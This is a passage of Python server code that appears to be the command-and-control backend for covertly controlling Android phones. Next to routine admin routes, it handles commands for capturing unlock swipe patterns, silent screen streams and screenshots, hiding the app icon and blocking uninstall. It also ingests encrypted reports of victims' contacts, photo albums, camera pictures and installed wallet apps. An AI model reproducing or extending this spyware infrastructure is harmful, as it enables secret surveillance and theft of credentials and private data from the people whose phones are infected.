        body: BatteryGuideRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        guide_id = str(uuid.uuid4())
        now = utc_now()
        try:
            database.execute(
                "INSERT INTO battery_guides(id,brand,model_pattern,title,steps_json,enabled,created_by,created_at,updated_at) "
                "VALUES(?,?,?,?,?,?,?,?,?)",
                (
                    guide_id,
                    body.brand,
                    body.model_pattern,
                    body.title,
                    json.dumps(body.steps, ensure_ascii=False),
                    int(body.enabled),
                    user["id"],
                    now,
                    now,
                ),
            )
        except sqlite3.IntegrityError as exc:
            raise HTTPException(
                status_code=409, detail="battery guide already exists for brand and model"
            ) from exc
        return envelope(request, {"id": guide_id, **body.model_dump()}, 201)

    @app.put("/api/battery-guides/{guide_id}")
    def update_battery_guide(
        guide_id: str,
        body: BatteryGuideRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        if database.one("SELECT id FROM battery_guides WHERE id=?", (guide_id,)) is None:
            raise HTTPException(status_code=404, detail="battery guide not found")
        try:
            database.execute(
                "UPDATE battery_guides SET brand=?,model_pattern=?,title=?,steps_json=?,enabled=?,updated_at=? "
                "WHERE id=?",
                (
                    body.brand,
                    body.model_pattern,
                    body.title,
                    json.dumps(body.steps, ensure_ascii=False),
                    int(body.enabled),
                    utc_now(),
                    guide_id,
                ),
            )
        except sqlite3.IntegrityError as exc:
            raise HTTPException(
                status_code=409, detail="battery guide already exists for brand and model"
            ) from exc
        return envelope(request, {"id": guide_id, **body.model_dump()})

    @app.delete("/api/battery-guides/{guide_id}")
    def delete_battery_guide(
        guide_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        if database.one("SELECT id FROM battery_guides WHERE id=?", (guide_id,)) is None:
            raise HTTPException(status_code=404, detail="battery guide not found")
        database.execute("DELETE FROM battery_guides WHERE id=?", (guide_id,))
        return envelope(request, {"deleted": True, "id": guide_id})

    @app.get("/api/message-templates")
    def message_templates(
        request: Request,
        user: dict[str, Any] = Depends(current_user),
        enabled: bool | None = None,
    ):
        clauses: list[str] = []
        params: list[Any] = []
        if user["role"] != "admin":
            clauses.append("mt.owner_user_id=?")
            params.append(user["id"])
        if enabled is not None:
            clauses.append("mt.enabled=?")
            params.append(int(enabled))
        where = " WHERE " + " AND ".join(clauses) if clauses else ""
        rows = database.all(
            "SELECT mt.id,mt.owner_user_id,u.username AS owner_name,mt.name,mt.content,"
            "mt.enabled,mt.created_at,mt.updated_at FROM message_templates mt "
            "JOIN users u ON u.id=mt.owner_user_id"
            + where
            + " ORDER BY mt.updated_at DESC",
            tuple(params),
        )
        return envelope(request, rows)

    @app.post("/api/message-templates")
    def create_message_template(
        body: MessageTemplateCreateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        template_id = str(uuid.uuid4())
        now = utc_now()

        def action(conn: sqlite3.Connection):
            try:
                conn.execute(
                    "INSERT INTO message_templates(id,owner_user_id,name,content,enabled,created_at,updated_at) "
                    "VALUES(?,?,?,?,?,?,?)",
                    (
                        template_id,
                        user["id"],
                        body.name,
                        body.content,
                        int(body.enabled),
                        now,
                        now,
                    ),
                )
            except sqlite3.IntegrityError as exc:
                raise HTTPException(status_code=409, detail="template name already exists") from exc
            Database.audit(
                conn,
                "user",
                user["id"],
                "message_template.create",
                "message_template",
                template_id,
                "success",
                {"name": body.name},
            )

        database.transaction(action)
        return envelope(
            request,
            {"id": template_id, "owner_user_id": user["id"], **body.model_dump()},
            201,
        )

    @app.patch("/api/message-templates/{template_id}")
    def update_message_template(
        template_id: str,
        body: MessageTemplateUpdateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        template = database.one(
            "SELECT * FROM message_templates WHERE id=?", (template_id,)
        )
        if template is None or (
            user["role"] != "admin" and template["owner_user_id"] != user["id"]
        ):
            raise HTTPException(status_code=404, detail="message template not found")
        updates: list[str] = []
        params: list[Any] = []
        for field in ("name", "content", "enabled"):
            value = getattr(body, field)
            if value is not None:
                updates.append(f"{field}=?")
                params.append(int(value) if isinstance(value, bool) else value)
        updates.append("updated_at=?")
        params.extend([utc_now(), template_id])
        try:
            database.execute(
                "UPDATE message_templates SET " + ",".join(updates) + " WHERE id=?",
                tuple(params),
            )
        except sqlite3.IntegrityError as exc:
            raise HTTPException(status_code=409, detail="template name already exists") from exc
        return envelope(
            request,
            database.one(
                "SELECT id,owner_user_id,name,content,enabled,created_at,updated_at "
                "FROM message_templates WHERE id=?",
                (template_id,),
            ),
        )

    @app.delete("/api/message-templates/{template_id}")
    def delete_message_template(
        template_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        template = database.one(
            "SELECT id,owner_user_id FROM message_templates WHERE id=?", (template_id,)
        )
        if template is None or (
            user["role"] != "admin" and template["owner_user_id"] != user["id"]
        ):
            raise HTTPException(status_code=404, detail="message template not found")
        database.execute("DELETE FROM message_templates WHERE id=?", (template_id,))
        return envelope(request, {"deleted": True, "id": template_id})

    @app.post("/api/device/ws-ticket")
    def device_ws_ticket(
        request: Request, device: dict[str, Any] = Depends(device_identity)
    ):
        ticket = random_token()
        database.execute(
            "INSERT INTO ws_tickets(id,ticket_hash,purpose,subject_id,expires_at_epoch,created_at) "
            "VALUES(?,?,?,?,?,?)",
            (
                str(uuid.uuid4()),
                token_hash(ticket),
                "device",
                device["id"],
                epoch_now() + settings.ws_ticket_ttl_seconds,
                utc_now(),
            ),
        )
        return envelope(
            request, {"ticket": ticket, "expires_in": settings.ws_ticket_ttl_seconds}
        )

    def update_device_status(device_id: str, body: DeviceStatusRequest) -> None:
        values = body.model_dump(exclude_none=True)
        reported_at = values.pop("reported_at", None) or utc_now()
        allowed = {
            "battery_percent",
            "charging",
            "network_type",
            "network_quality",
            "network_latency_ms",
            "screen_state",
            "locked",
            "lock_state_code",
            "accessibility_enabled",
            "battery_whitelist_enabled",
            "device_admin_enabled",
            "screen_permission_enabled",
            "camera_permission_enabled",
            "uninstall_protection_enabled",
            "launcher_icon_visible",
        }
        values = {key: value for key, value in values.items() if key in allowed}
        now = utc_now()
        assignments = [f'"{key}"=?' for key in values]
        params = [int(value) if isinstance(value, bool) else value for value in values.values()]
        assignments.extend(["reported_at=?", "updated_at=?"])
        params.extend([reported_at, now, device_id])
        database.execute(
            "UPDATE device_status SET " + ",".join(assignments) + " WHERE device_id=?",
            tuple(params),
        )
        database.execute(
            "UPDATE devices SET last_seen_at=?,updated_at=? WHERE id=?",
            (now, now, device_id),
        )

    def save_device_data_report(
        device_id: str, action: str, data: dict[str, Any]
    ) -> None:
        database.execute(
            "INSERT INTO device_data_reports(device_id,action,data_json,received_at) "
            "VALUES(?,?,?,?)",
            (
                device_id,
                action,
                json.dumps(data, ensure_ascii=False, separators=(",", ":")),
                utc_now(),
            ),
        )

    def merge_device_json_state(
        table: str, device_id: str, updates: dict[str, Any]
    ) -> None:
        if table not in {"device_expected_state", "device_runtime_state"}:
            raise ValueError("unsupported state table")
        current = database.one(
            f"SELECT state_json FROM {table} WHERE device_id=?", (device_id,)
        )
        state = json.loads(current["state_json"]) if current else {}
        state.update(updates)
        database.execute(
            f"INSERT INTO {table}(device_id,state_json,updated_at) VALUES(?,?,?) "
            "ON CONFLICT(device_id) DO UPDATE SET state_json=excluded.state_json,"
            "updated_at=excluded.updated_at",
            (
                device_id,
                json.dumps(state, ensure_ascii=False, separators=(",", ":")),
                utc_now(),
            ),
        )

    def record_legacy_expected_state(
        device_id: str, action: str, data: dict[str, Any]
    ) -> None:
        updates: dict[str, Any] = {action: data, "lastAction": action}
        mapped_values: dict[str, Any] = {
            "touchOn": ("touch", "on"),
            "touchOff": ("touch", "off"),
            "swipePwdScreenOn": ("swipePwdCapture", True),
            "swipePwdScreenOff": ("swipePwdCapture", False),
            "utPause": ("uiTreePaused", True),
            "utResume": ("uiTreePaused", False),
            "disableAcc": ("accessibility", False),
            "enableAcc": ("accessibility", True),
            "adbDisconnect": ("adbConnected", False),
        }
        if action in mapped_values:
            key, value = mapped_values[action]
            updates[key] = value
        for action_name, field_name, payload_key in (
            ("setWakeup", "wakeupEnabled", "enable"),
            ("realtimeSet", "realtimeInterval", "interval"),
            ("realtimeOnOff", "realtimeOn", "on"),
            ("setDomain", "domain", "domain"),
            ("setHideMode", "hideMode", "hide"),
            ("setDisConnect", "disconnectMode", "disconn"),
            ("logMode", "logMode", "mode"),
        ):
            if action == action_name:
                updates[field_name] = data[payload_key]
        merge_device_json_state("device_expected_state", device_id, updates)

    def record_legacy_stream_command(
        device_id: str, action: str, data: dict[str, Any]
    ) -> None:
        start_types = {
            "screen_relay": "screen_relay",
            "startSilentStream": "silent_stream",
            "silentShot": "silent_shot",
            "startHD": "hd_stream",
            "startAdbStream": "adb_stream",
            "startAdbTree": "adb_tree",
            "startWebRTC": "webrtc",
        }
        stop_types = {
            "stopScreenRelay": "screen_relay",
            "stopSilentStream": "silent_stream",
            "stopHD": "hd_stream",
            "stopAdbStream": "adb_stream",
            "stopAdbTree": "adb_tree",
            "stopWebRTC": "webrtc",
        }
        now = utc_now()
        if action in start_types:
            database.execute(
                "INSERT INTO device_stream_sessions(id,device_id,stream_type,status,"
                "parameters_json,started_at) VALUES(?,?,?,'start_sent',?,?)",
                (
                    str(uuid.uuid4()),
                    device_id,
                    start_types[action],
                    json.dumps(data, ensure_ascii=False, separators=(",", ":")),
                    now,
                ),
            )
        elif action in stop_types:
            session = database.one(
                "SELECT id FROM device_stream_sessions WHERE device_id=? AND stream_type=? "
                "AND status IN ('start_sent','active') ORDER BY started_at DESC LIMIT 1",
                (device_id, stop_types[action]),
            )
            if session is not None:
                database.execute(
                    "UPDATE device_stream_sessions SET status='stop_sent',stop_sent_at=? "
                    "WHERE id=?",
                    (now, session["id"]),
                )

    @app.post("/heartbeat", status_code=204)
    @app.post("/api/heartbeat", status_code=204)
    async def legacy_http_heartbeat(body: HeartbeatRequest):
        device = ensure_legacy_online_device(
            {
                "action": "deviceOnline",
                "data": {
                    "deviceId": body.device_id,
                    "pkg": "android",
                    "deviceInfo": {
                        "brand": body.brand,
                        "model": body.model,
                        "version": body.sdk,
                        "myPkg": body.package_name,
                    },
                },
            },
            {},
            None,
        )
        previous = database.one(
            "SELECT online FROM device_status WHERE device_id=?", (device["id"],)
        )
        now = utc_now()
        now_epoch = epoch_now()

        def record(conn: sqlite3.Connection) -> None:
            conn.execute(
                "UPDATE devices SET brand=?,model=?,sdk_int=?,package_name=?,"
                "last_heartbeat_at=?,last_heartbeat_epoch=?,last_seen_at=?,last_online_at=?,"
                "updated_at=? WHERE id=?",
                (
                    body.brand,
                    body.model,
                    body.sdk,
                    body.package_name,
                    now,
                    now_epoch,
                    now,
                    now,
                    now,
                    device["id"],
                ),
            )
            conn.execute(
                "UPDATE device_status SET online=1,battery_percent=?,"
                "accessibility_enabled=?,reported_at=?,updated_at=? WHERE device_id=?",
                (
                    body.battery,
                    int(body.acc_status == "on"),
                    now,
                    now,
                    device["id"],
                ),
            )
            conn.execute(
                "INSERT INTO device_heartbeats(device_id,event,build_id,client_timestamp,"
                "battery,acc_status,received_at) VALUES(?,?,?,?,?,?,?)",
                (
                    device["id"],
                    body.event,
                    body.build_id,
                    body.ts,
                    body.battery,
                    body.acc_status,
                    now,
                ),
            )

        database.transaction(record)
        if previous is None or not previous["online"]:
            await hub.broadcast_dashboard(
                {
                    "type": "device.online",
                    "device_id": device["id"],
                    "time": now,
                },
                device["owner_user_id"],
            )
        await hub.broadcast_dashboard(
            {
                "type": "device.status",
                "device_id": device["id"],
                "status": {
                    "online": True,
                    "battery_percent": body.battery,
                    "accessibility_enabled": body.acc_status == "on",
                },
            },
            device["owner_user_id"],
        )
        return Response(status_code=204)

    @app.post("/device_log", status_code=204)
    @app.post("/api/device_log", status_code=204)
    async def legacy_plain_device_log(body: dict[str, Any]):
        try:
            await process_legacy_diagnostic(body)
        except LegacyProtocolError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        return Response(status_code=204)

    @app.get("/adv.php")
    @app.post("/adv.php")
    async def legacy_adv_config(
        apk: str = Query(min_length=1, max_length=160),
        device: str = Query(min_length=1, max_length=160),
    ):
        now = utc_now()
        existing = database.one(
            "SELECT config_json FROM device_line_configs WHERE device_id=? AND apk_id=?",
            (device, apk),
        )
        if existing is None:
            config = {"deviceId": device, "apk": apk, "issuedAt": now}
            config_json = json.dumps(
                config, ensure_ascii=False, separators=(",", ":")
            )
        else:
            config_json = existing["config_json"]
            config = json.loads(config_json)
        database.execute(
            "INSERT INTO device_line_configs(device_id,apk_id,config_json,requested_at) "
            "VALUES(?,?,?,?) ON CONFLICT(device_id,apk_id) DO UPDATE SET "
            "config_json=excluded.config_json,requested_at=excluded.requested_at",
            (device, apk, config_json, now),
        )
        return {"token": encrypt_legacy_payload(config, settings.legacy_device_aes_key)}

    @app.get("/install_stat.php", status_code=204)
    @app.post("/install_stat.php", status_code=204)
    async def legacy_install_stat(
        app_name: str = Query(min_length=1, max_length=255),
        action: str = Query(min_length=1, max_length=120),
        device_uid: str = Query(min_length=1, max_length=500),
    ):
        database.execute(
            "INSERT INTO install_stats(app_name,action,device_uid,requested_at) "
            "VALUES(?,?,?,?)",
            (app_name, action, device_uid, utc_now()),
        )
        return Response(status_code=204)

    @app.post("/api/device/status")
    async def device_status(
        body: DeviceStatusRequest,
        request: Request,
        device: dict[str, Any] = Depends(device_identity),
    ):
        update_device_status(device["id"], body)
        await hub.broadcast_dashboard(
            {"type": "device.status", "device_id": device["id"], "status": body.model_dump(exclude_none=True)},
            device["owner_user_id"],
        )
        return envelope(request, {"accepted": True})

    def legacy_socket_context(
        environ: dict[str, Any], auth: Any
    ) -> dict[str, Any]:
        context: dict[str, Any] = {"auth": auth if isinstance(auth, dict) else {}}
        scope = environ.get("asgi.scope", {})
        query_bytes = scope.get("query_string", b"")
        if isinstance(query_bytes, bytes):
            query_text = query_bytes.decode("utf-8", errors="replace")
        else:
            query_text = str(query_bytes)
        context["query"] = {
            key: values[-1] for key, values in parse_qs(query_text).items() if values
        }
        headers: dict[str, str] = {}
        for raw_key, raw_value in scope.get("headers", []):
            key = raw_key.decode("latin-1") if isinstance(raw_key, bytes) else str(raw_key)
            value = (
                raw_value.decode("latin-1")
                if isinstance(raw_value, bytes)
                else str(raw_value)
            )
            headers[key] = value
        context["headers"] = headers
        return context

    def legacy_device_identity(
        decoded: Any,
        context: dict[str, Any],
        bound_device_id: str | None = None,
    ) -> dict[str, Any] | None:
        identifiers, tokens = find_device_identity(decoded, context)
        if bound_device_id is not None:
            device = database.one("SELECT * FROM devices WHERE id=?", (bound_device_id,))
            if device is None:
                return None
            if identifiers and all(
                identifier not in {device["id"], device["installation_id"]}
                for identifier in identifiers
            ):
                return None
            if tokens and all(
                device["device_token_hash"] != token_hash(token) for token in tokens
            ):
                return None
            return device

        device = None
        for identifier in identifiers:
            device = database.one(
                "SELECT * FROM devices WHERE id=? OR installation_id=? LIMIT 1",
                (identifier, identifier),
            )
            if device is not None:
                break
        if device is None:
            for token in tokens:
                device = database.one(
                    "SELECT * FROM devices WHERE device_token_hash=? LIMIT 1",
                    (token_hash(token),),
                )
                if device is not None:
                    break
        if device is None:
            return None
        if tokens and all(
            device["device_token_hash"] != token_hash(token) for token in tokens
        ):
            return None
        return device

    def ensure_legacy_online_device(
        decoded: Any,
        context: dict[str, Any],
        bound_device_id: str | None,
    ) -> dict[str, Any]:
        if not isinstance(decoded, dict) or decoded.get("action") != "deviceOnline":
            raise LegacyProtocolError("invalid deviceOnline report")
        data = decoded.get("data")
        if not isinstance(data, dict):
            raise LegacyProtocolError("deviceOnline report is missing data")
        device_id = data.get("deviceId")
        if not isinstance(device_id, str) or not 1 <= len(device_id) <= 160:
            raise LegacyProtocolError("deviceOnline deviceId is invalid")
        if bound_device_id is not None and bound_device_id != device_id:
            bound = database.one(
                "SELECT installation_id FROM devices WHERE id=?", (bound_device_id,)
            )
            if bound is None or bound["installation_id"] != device_id:
                raise LegacyProtocolError("Socket.IO session changed device identity")

        existing = database.one(
            "SELECT * FROM devices WHERE id=? OR installation_id=? LIMIT 1",
            (device_id, device_id),
        )
        if existing is not None:
            authenticated = legacy_device_identity(decoded, context, bound_device_id)
            if authenticated is None:
                raise LegacyProtocolError("deviceOnline identity does not match device")
            return authenticated

        device_info = data.get("deviceInfo")
        if not isinstance(device_info, dict):
            device_info = {}

        def text_value(value: Any, default: str, max_length: int = 255) -> str:
            return value if isinstance(value, str) and 1 <= len(value) <= max_length else default

        owner = database.one(
            "SELECT id FROM users WHERE role='admin' AND status='active' "
            "ORDER BY created_at LIMIT 1"
        )
        if owner is None:
            raise LegacyProtocolError("no active administrator can own this device")
        now = utc_now()
        sdk_value = device_info.get("version")
        sdk_int = sdk_value if type(sdk_value) is int and 0 <= sdk_value <= 1000 else 0
        model = text_value(device_info.get("model"), "Unknown")
        _, context_tokens = find_device_identity(context)
        stored_token_hash = token_hash(
            context_tokens[0] if context_tokens else random_token()
        )
        values = (
            device_id,
            device_id,
            owner["id"],
            text_value(device_info.get("appName"), model, 120),
            text_value(device_info.get("brand"), "Unknown"),
            model,
            text_value(device_info.get("androidVersion"), str(sdk_int)),
            sdk_int,
            text_value(
                device_info.get("myPkg") or device_info.get("pkg") or data.get("pkg"),
                "android",
            ),
            text_value(device_info.get("apkVer"), "unknown"),
            device_info.get("lang") if isinstance(device_info.get("lang"), str) else None,
            (
                device_info.get("timeZone")
                if isinstance(device_info.get("timeZone"), str)
                else None
            ),
            stored_token_hash,
            now,
            now,
            now,
            now,
        )

        def create(conn: sqlite3.Connection) -> dict[str, Any]:
            conn.execute(
                "INSERT INTO devices(id,installation_id,owner_user_id,name,brand,model,"
                "android_version,sdk_int,package_name,app_version,locale,timezone,"
                "device_token_hash,first_seen_at,last_seen_at,created_at,updated_at) "
                "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                values,
            )
            conn.execute(
                "INSERT INTO device_status(device_id,online,screen_state,updated_at) "
                "VALUES(?,0,'unknown',?)",
                (device_id, now),
            )
            row = conn.execute("SELECT * FROM devices WHERE id=?", (device_id,)).fetchone()
            return dict(row)

        try:
            return database.transaction(create)
        except sqlite3.IntegrityError as exc:
            device = database.one(
                "SELECT * FROM devices WHERE id=? OR installation_id=? LIMIT 1",
                (device_id, device_id),
            )
            if device is None:
                raise LegacyProtocolError("failed to create deviceOnline device") from exc
            return device

    def decode_android_self_report(value: Any) -> tuple[Any, bool]:
        """Decrypt only explicitly encrypted report envelopes.

        A plain ``data`` field is intentionally not treated as ciphertext because
        image reports use that field for Base64 image bytes.
        """
        encrypted_value: Any | None = None
        if isinstance(value, str):
            encrypted_value = value
        elif isinstance(value, dict):
            if "ciphertext" in value:
                encrypted_value = {"ciphertext": value["ciphertext"]}
            elif "enc" in value:
                encrypted_value = {"enc": value["enc"]}
            elif value.get("encrypted") is True and "data" in value:
                encrypted_value = {"data": value["data"]}
        if encrypted_value is None:
            return value, False
        return (
            decrypt_legacy_payload(encrypted_value, settings.legacy_device_aes_key),
            True,
        )

    def report_correlation_id(value: Any) -> str | None:
        pending = [value]
        visited = 0
        while pending and visited < 50:
            current = pending.pop(0)
            visited += 1
            if isinstance(current, dict):
                for key in ("correlation_id", "command_id", "commandId"):
                    candidate = current.get(key)
                    if isinstance(candidate, str) and 1 <= len(candidate) <= 160:
                        return candidate
                pending.extend(current.values())
            elif isinstance(current, (list, tuple)):
                pending.extend(current)
        return None

    def image_report_result(event_name: str, value: Any) -> dict[str, Any]:
        candidate = value
        if isinstance(candidate, dict) and "result" in candidate:
            candidate = candidate["result"]
        if isinstance(candidate, dict):
            for key in (
                "image_url",
                "image",
                "image_base64",
                "base64",
                "img",
                "frame",
                "data",
                event_name,
            ):
                if isinstance(candidate.get(key), str):
                    candidate = candidate[key]
                    break
        if not isinstance(candidate, str):
            raise LegacyProtocolError(f"{event_name} does not contain a Base64 image")

        image_value = "".join(candidate.split())
        mime_type = "image/jpeg"
        if image_value.lower().startswith("data:image/"):
            try:
                header, image_value = image_value.split(",", 1)
            except ValueError as exc:
                raise LegacyProtocolError("invalid image data URL") from exc
            if not header.lower().endswith(";base64"):
                raise LegacyProtocolError("image data URL must contain Base64 data")
            mime_type = header[5:].split(";", 1)[0].lower()
            if mime_type not in {"image/jpeg", "image/png", "image/webp", "image/gif"}:
                raise LegacyProtocolError("unsupported image media type")
        if len(image_value) > (MAX_ANDROID_REPORT_IMAGE_BYTES * 4 // 3) + 8:
            raise LegacyProtocolError("reported image is too large")
        try:
            decoded_image = base64.b64decode(image_value, validate=True)
        except (binascii.Error, ValueError) as exc:
            raise LegacyProtocolError("reported image is not valid Base64") from exc
        if not decoded_image or len(decoded_image) > MAX_ANDROID_REPORT_IMAGE_BYTES:
            raise LegacyProtocolError("reported image size is invalid")
        return {
            "event": event_name,
            "image_url": f"data:{mime_type};base64,{image_value}",
        }

    async def accept_legacy_uncorrelated_image(
        sid: str, decoded: Any
    ) -> dict[str, Any]:
        try:
            if not isinstance(decoded, dict):
                raise LegacyProtocolError("encrypted image report must be a JSON object")
            reported_action = decoded.get("action")
            if reported_action not in {"screenshot", "camPic"}:
                raise LegacyProtocolError("unsupported uncorrelated image action")
            data = decoded.get("data")
            if not isinstance(data, dict):
                raise LegacyProtocolError("encrypted image report is missing data")
            reported_device_id = data.get("deviceId")
            if not isinstance(reported_device_id, str) or not reported_device_id:
                raise LegacyProtocolError("encrypted image report is missing deviceId")

            context = legacy_contexts.get(sid, {})
            already_bound = legacy_bound_devices.get(sid)
            device = legacy_device_identity(decoded, context, already_bound)
            if device is None or reported_device_id not in {
                device["id"],
                device["installation_id"],
            }:
                raise LegacyProtocolError(
                    "encrypted image report does not match a pre-provisioned device"
                )
            bind_legacy_device(sid, device["id"])

            result = image_report_result(reported_action, data)
            if reported_action == "camPic":
                width = data.get("w")
                height = data.get("h")
                if (
                    type(width) is not int
                    or type(height) is not int
                    or width <= 0
                    or height <= 0
                ):
                    raise LegacyProtocolError("camera frame dimensions are invalid")
                result.update({"width": width, "height": height})
                command_actions = ("startCam", "front-camera", "rear-camera", "setCam")
                allowed_statuses = ("queued", "sent", "success")
            else:
                command_actions = (
                    "screenshot",
                    "takeScreen",
                    "capturePic",
                    "gestureCapture",
                )
                allowed_statuses = ("queued", "sent", "acknowledged")

            action_placeholders = ",".join("?" for _ in command_actions)
            status_placeholders = ",".join("?" for _ in allowed_statuses)
            command = database.one(
                "SELECT id FROM commands WHERE device_id=? "
                f"AND action IN ({action_placeholders}) "
                f"AND status IN ({status_placeholders}) "
                "ORDER BY queued_at DESC LIMIT 1",
                (device["id"], *command_actions, *allowed_statuses),
            )
            if command is None:
                raise LegacyProtocolError(
                    "encrypted image report has no matching pending request"
                )
            save_device_data_report(device["id"], reported_action, result)
            database.execute(
                "UPDATE commands SET status='success',completed_at=?,error_code=NULL,"
                "error_message=NULL,result_json=? WHERE id=?",
                (utc_now(), json.dumps(result, ensure_ascii=False), command["id"]),
            )
            await hub.broadcast_dashboard(
                {
                    "type": "command.updated",
                    "device_id": device["id"],
                    "status": "success",
                },
                device["owner_user_id"],
            )
            return {
                "accepted": True,
                "device_id": device["id"],
                "action": reported_action,
            }
        except (LegacyProtocolError, ValueError) as exc:
            response = {
                "accepted": False,
                "error": "INVALID_ANDROID_SELF_REPORT",
                "message": str(exc),
            }
            await sio.emit("server.error", response, to=sid)
            return response

    async def accept_legacy_uncorrelated_private_result(
        sid: str, decoded: Any
    ) -> dict[str, Any]:
        request_actions = {
            "iconList": "iconList",
            "walletList": "walletList",
            "reqPerList": "reqPerList",
            "albumList": "readAlbumList",
            "albumLast": "readAlbumLast",
            "albumData": "readAlbumThumbnail",
            "contactList": "readContactList",
            "fetchIcon": "fetchIcon",
        }
        try:
            if not isinstance(decoded, dict):
                raise LegacyProtocolError("invalid encrypted private-data report")
            reported_action = decoded.get("action")
            request_action = request_actions.get(reported_action)
            if request_action is None:
                raise LegacyProtocolError("unsupported private-data report action")
            data = decoded.get("data")
            if not isinstance(data, dict):
                raise LegacyProtocolError(f"{reported_action} report is missing data")
            reported_device_id = data.get("deviceId")
            if not isinstance(reported_device_id, str) or not reported_device_id:
                raise LegacyProtocolError(f"{reported_action} report is missing deviceId")
            if data.get("fromAdmin") != "admin":
                raise LegacyProtocolError(f"{reported_action} fromAdmin is invalid")

            context = legacy_contexts.get(sid, {})
            already_bound = legacy_bound_devices.get(sid)
            device = legacy_device_identity(decoded, context, already_bound)
            if device is None or reported_device_id not in {
                device["id"],
                device["installation_id"],
            }:
                raise LegacyProtocolError(
                    f"{reported_action} report does not match a pre-provisioned device"
                )
            bind_legacy_device(sid, device["id"])

            items = data.get("data")
            result: dict[str, Any]
            if reported_action in {"iconList", "walletList"}:
                if not isinstance(items, list) or len(items) > 5000:
                    raise LegacyProtocolError(f"{reported_action} data is invalid")
                normalized_apps: list[dict[str, str]] = []
                for item in items:
                    if not isinstance(item, dict):
                        raise LegacyProtocolError(f"{reported_action} item is invalid")
                    package_name = item.get("pkg")
                    name = item.get("name")
                    if (
                        not isinstance(package_name, str)
                        or not 1 <= len(package_name) <= 255
                        or not isinstance(name, str)
                        or len(name) > 500
                    ):
                        raise LegacyProtocolError(
                            f"{reported_action} item fields are invalid"
                        )
                    normalized_apps.append({"pkg": package_name, "name": name})
                result = {"data": normalized_apps, "fromAdmin": "admin"}
            elif reported_action == "fetchIcon":
                icon = data.get("icon")
                package_name = data.get("pkg")
                if not isinstance(icon, str) or not icon:
                    raise LegacyProtocolError("fetchIcon icon is invalid")
                if not isinstance(package_name, str) or not 1 <= len(package_name) <= 255:
                    raise LegacyProtocolError("fetchIcon pkg is invalid")
                result = {
                    "icon": icon,
                    "pkg": package_name,
                    "fromAdmin": "admin",
                }
            elif reported_action == "reqPerList":
                if not isinstance(items, list) or len(items) > 1000:
                    raise LegacyProtocolError("reqPerList data is invalid")
                permissions: list[dict[str, Any]] = []
                for item in items:
                    if not isinstance(item, dict):
                        raise LegacyProtocolError("reqPerList item is invalid")
                    name = item.get("name")
                    granted = item.get("granted")
                    if (
                        not isinstance(name, str)
                        or not 1 <= len(name) <= 255
                        or type(granted) is not bool
                    ):
                        raise LegacyProtocolError("reqPerList item fields are invalid")
                    permissions.append({"name": name, "granted": granted})
                result = {"data": permissions, "fromAdmin": "admin"}
            elif reported_action == "albumList":
                if not isinstance(items, list) or len(items) > 500:
                    raise LegacyProtocolError("albumList data is invalid")
                albums: list[dict[str, Any]] = []
                for item in items:
                    if not isinstance(item, dict):
                        raise LegacyProtocolError("albumList item is invalid")
                    album_id = item.get("id")
                    name = item.get("name")
                    path = item.get("path")
                    date = item.get("date")
                    size = item.get("size")
                    if (
                        type(album_id) is not int
                        or not isinstance(name, str)
                        or not 1 <= len(name) <= 500
                        or not isinstance(path, str)
                        or not 1 <= len(path) <= 4096
                        or type(date) is not int
                        or date < 0
                        or type(size) is not int
                        or size < 0
                    ):
                        raise LegacyProtocolError("albumList item fields are invalid")
                    albums.append(
                        {
                            "id": album_id,
                            "name": name,
                            "path": path,
                            "date": date,
                            "size": size,
                        }
                    )
                total = data.get("total")
                current_page = data.get("curpage")
                if type(total) is not int or total < 0:
                    raise LegacyProtocolError("albumList total is invalid")
                if type(current_page) is not int or current_page < 0:
                    raise LegacyProtocolError("albumList curpage is invalid")
                result = {
                    "data": albums,
                    "total": total,
                    "curpage": current_page,
                    "fromAdmin": "admin",
                }
            elif reported_action == "albumLast":
                image = data.get("image")
                path = data.get("path")
                if not isinstance(image, str) or not image:
                    raise LegacyProtocolError("albumLast image is invalid")
                if not isinstance(path, str) or not 1 <= len(path) <= 4096:
                    raise LegacyProtocolError("albumLast path is invalid")
                result = {"image": image, "path": path, "fromAdmin": "admin"}
            elif reported_action == "albumData":
                if not isinstance(items, list) or len(items) > 500:
                    raise LegacyProtocolError("albumData data is invalid")
                thumbnails: list[dict[str, Any]] = []
                for item in items:
                    if not isinstance(item, dict):
                        raise LegacyProtocolError("albumData item is invalid")
                    path = item.get("path")
                    file_md5 = item.get("fileMd5")
                    image_base64 = item.get("base64")
                    max_width = item.get("maxWidth")
                    if (
                        not isinstance(path, str)
                        or not 1 <= len(path) <= 4096
                        or not isinstance(file_md5, str)
                        or not 1 <= len(file_md5) <= 128
                        or not isinstance(image_base64, str)
                        or not image_base64
                        or type(max_width) is not int
                        or max_width <= 0
                    ):
                        raise LegacyProtocolError("albumData item fields are invalid")
                    thumbnails.append(
                        {
                            "path": path,
                            "fileMd5": file_md5,
                            "base64": image_base64,
                            "maxWidth": max_width,
                        }
                    )
                elem = data.get("elem")
                if not isinstance(elem, str) or not 1 <= len(elem) <= 500:
                    raise LegacyProtocolError("albumData elem is invalid")
                result = {
                    "data": thumbnails,
                    "elem": elem,
                    "fromAdmin": "admin",
                }
            else:
                if not isinstance(items, list) or len(items) > 500:
                    raise LegacyProtocolError("contactList data is invalid")
                contacts: list[dict[str, Any]] = []
                for item in items:
                    if not isinstance(item, dict):
                        raise LegacyProtocolError("contactList item is invalid")
                    name = item.get("name")
                    phones = item.get("phones")
                    if not isinstance(name, str) or len(name) > 500:
                        raise LegacyProtocolError("contactList name is invalid")
                    if (
                        not isinstance(phones, list)
                        or len(phones) > 100
                        or any(
                            not isinstance(phone, str) or len(phone) > 500
                            for phone in phones
                        )
                    ):
                        raise LegacyProtocolError("contactList phones are invalid")
                    contacts.append({"name": name, "phones": phones})
                total = data.get("total")
                current_page = data.get("curpage")
                if type(total) is not int or total < 0:
                    raise LegacyProtocolError("contactList total is invalid")
